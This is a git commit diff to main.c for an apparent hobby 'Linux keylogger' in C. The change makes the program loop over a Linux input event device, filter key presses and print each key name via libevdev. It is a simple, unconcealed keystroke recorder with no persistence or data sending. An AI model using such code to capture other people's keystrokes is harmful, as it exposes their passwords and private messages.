6f788d360ed57e41633df349a7aec7ef64157fba
WHITEROSE <firasmoussa60@gmail.com>
2026-02-28 22:50:17 +0100

    capture and log keycodes

--- main.c
+++ main.c
@@ -2,25 +2,41 @@
 #include <linux/input.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <libevdev/libevdev.h>
 
 
-int main(int argc, char *argv[]) {
+int main(int argc, char *argv[]) 
+{
 
     if (argc != 2) 
     {
         printf("Usage: %s <event-file-path>\n", argv[0]);
         return -1;
     }
-    printf("Linux Keylogger\n");
-    
+
+    printf("LINUX KEYLOGGER\n");
 
     int fd = open(argv[1], O_RDONLY, 0);
 
     struct input_event ie;
 
-    read(fd, &ie, sizeof(ie));
+    while (1)
+    {         
+        read(fd, &ie, sizeof(ie));
 
-    printf("Key pressed: %d\n", ie.code);
+        if (ie.type != EV_KEY)
+        {
+            continue;
+        }
+
+        if (ie.value != 1)
+        {
+            continue;
+        }
+
+        printf("Key pressed: %s\n", libevdev_event_code_get_name(EV_KEY, ie.code));
+
+    }
 
     return 0;
 }
